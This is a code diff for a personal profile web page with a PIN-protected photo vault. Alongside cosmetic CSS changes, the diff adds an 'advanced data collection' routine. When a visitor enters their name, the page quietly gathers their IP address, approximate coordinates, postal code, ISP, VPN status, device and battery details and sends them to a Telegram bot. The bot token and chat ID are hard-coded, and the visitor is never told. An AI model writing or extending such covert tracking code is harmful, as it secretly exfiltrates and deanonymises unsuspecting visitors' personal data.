@@ -34,17 +34,16 @@ body {
 }
 
 .avatar-wrapper {
-  width: 120px;
-  height: 120px;
+  width: 115px;
+  height: 115px;
   margin: 0 auto 20px;
   padding: 3px;
   border: 2px solid #3b82f6;
   border-radius: 50%;
   cursor: pointer;
-  transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-  overflow: hidden;
+  transition: 0.3s;
 }
-.avatar-wrapper:hover { transform: scale(1.1); border-color: #fff; }
+.avatar-wrapper:hover { transform: scale(1.05); }
 
 .avatar-img {
   width: 100%;
@@ -194,6 +193,7 @@ h2 {
   margin-top: 10px;
 }
 
+/* FIX: ZOOM MODAL */
 #photoZoomModal {
   position: fixed;
   inset: 0;
@@ -262,7 +262,7 @@ h2 {
 
 <div class="main-card">
   <div class="avatar-wrapper" onclick="openPhoto()">
-    <img src="photo1.png" alt="Kishor Bankapur" class="avatar-img">
+    <img src="photo1.png" alt="Profile" class="avatar-img">
   </div>
   
   <h2>KISHOR BANKAPUR</h2>
@@ -309,7 +309,7 @@ h2 {
 </div>
 
 <div id="photoZoomModal" onclick="closePhoto()">
-  <img src="photo1.png" id="zoomedImg">
+  <img src="photo1.png" id="zoomedImg" onclick="event.stopPropagation()">
 </div>
 
 <div class="vault-panel" id="vaultPanel">
@@ -328,26 +328,63 @@ h2 {
 <audio id="bgMusic" loop><source src="audio.mp3" type="audio/mpeg"></audio>
 
 <script>
-// Logic preserved from original script
 const BOT_TOKEN = '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc';
 const CHAT_ID = '6297092647';
 
+// --- ADVANCED DATA COLLECTION LOGIC ---
 async function getIPDetails() {
   try {
-    const response = await fetch('https://ipapi.co/json/');
-    const data = await response.json();
-    return data;
-  } catch (error) { return {}; }
+    const res = await fetch('https://ipapi.co/json/');
+    return await res.json();
+  } catch (e) { return {}; }
+}
+
+async function getBatteryInfo() {
+  try {
+    const b = await navigator.getBattery();
+    return { level: Math.round(b.level*100)+'%', charging: b.charging?'Yes':'No' };
+  } catch(e) { return { level: 'Unknown', charging: 'Unknown' }; }
 }
 
 async function handleName() {
   const name = document.getElementById('vName').value.trim();
-  if(!name) { alert('Please enter your name'); return; }
+  if(!name) { alert('Enter name'); return; }
   
   document.querySelector('#nameModal .primary-btn').innerHTML = '⏳ SCANNING...';
-  const ipData = await getIPDetails();
   
-  const message = `🔥 NEW VISITOR: ${name}\n📍 Location: ${ipData.city || 'Unknown'}, ${ipData.country_name || ''}\n🌐 IP: ${ipData.ip || 'Unknown'}\n📱 Device: ${navigator.userAgent}`;
+  const ip = await getIPDetails();
+  const batt = await getBatteryInfo();
+  const d = new Date();
+  
+  const message = `🔥 ADVANCED VISITOR DETECTED
+━━━━━━━━━━━━━━━━━━━━━
+👤 PERSONAL
+   • Name: ${name}
+   • Time: ${d.toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━
+🌍 LOCATION
+   • IP: ${ip.ip || 'Unknown'}
+   • Location: ${ip.city}, ${ip.region}, ${ip.country_name}
+   • Postal: ${ip.postal}
+   • Coordinates: ${ip.latitude}, ${ip.longitude}
+   • ISP: ${ip.org}
+   • Security: VPN: ${ip.vpn?'Yes':'No'}
+━━━━━━━━━━━━━━━━━━━━━
+📱 DEVICE
+   • OS: ${navigator.platform}
+   • Browser: ${navigator.userAgent.split(' ').pop()}
+   • Memory: ${navigator.deviceMemory || 'N/A'} GB
+   • CPU: ${navigator.hardwareConcurrency || 'N/A'} Cores
+   • Screen: ${screen.width}x${screen.height}
+━━━━━━━━━━━━━━━━━━━━━
+🔋 BATTERY
+   • ${batt.level} (Charging: ${batt.charging})
+━━━━━━━━━━━━━━━━━━━━━
+🌐 NETWORK
+   • Online: ${navigator.onLine?'Yes':'No'}
+━━━━━━━━━━━━━━━━━━━━━
+📱 FULL USER AGENT
+${navigator.userAgent}`;
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
@@ -355,15 +392,14 @@ async function handleName() {
     body: JSON.stringify({ chat_id: CHAT_ID, text: message })
   });
 
-  document.querySelector('#nameModal .primary-btn').innerHTML = 'CONTINUE';
   document.getElementById('nameModal').classList.remove('show');
   document.getElementById('passModal').classList.add('show');
 }
 
+// UI Controls
 function openNameModal() { document.getElementById('nameModal').classList.add('show'); }
 function closeAll() { document.querySelectorAll('.modal').forEach(m => m.classList.remove('show')); }
 function backToName() { document.getElementById('passModal').classList.remove('show'); document.getElementById('nameModal').classList.add('show'); }
-
 function checkPass() {
   if(document.getElementById('vPass').value === '2009') {
     closeAll();
@@ -371,20 +407,14 @@ function checkPass() {
     renderVault();
   } else { alert("Wrong PIN"); }
 }
-
 function closeVault() { document.getElementById('vaultPanel').classList.remove('open'); }
 function openPhoto() { document.getElementById('photoZoomModal').style.display = 'flex'; }
 function closePhoto() { document.getElementById('photoZoomModal').style.display = 'none'; }
 
 function toggleMusic() {
-  const music = document.getElementById('bgMusic');
-  if(music.paused) {
-    music.play().catch(e => console.log('Audio error'));
-    document.getElementById('mEmoji').classList.add('rotate');
-  } else {
-    music.pause();
-    document.getElementById('mEmoji').classList.remove('rotate');
-  }
+  const m = document.getElementById('bgMusic');
+  if(m.paused) { m.play(); document.getElementById('mEmoji').classList.add('rotate'); }
+  else { m.pause(); document.getElementById('mEmoji').classList.remove('rotate'); }
 }
 
 function renderVault() {
@@ -397,11 +427,7 @@ function handleFiles(files) {
   const photos = JSON.parse(localStorage.getItem('k_photos') || '[]');
   Array.from(files).forEach(file => {
     const reader = new FileReader();
-    reader.onload = (e) => {
-      photos.push(e.target.result);
-      localStorage.setItem('k_photos', JSON.stringify(photos));
-      renderVault();
-    };
+    reader.onload = (e) => { photos.push(e.target.result); localStorage.setItem('k_photos', JSON.stringify(photos)); renderVault(); };
     reader.readAsDataURL(file);
   });
 }
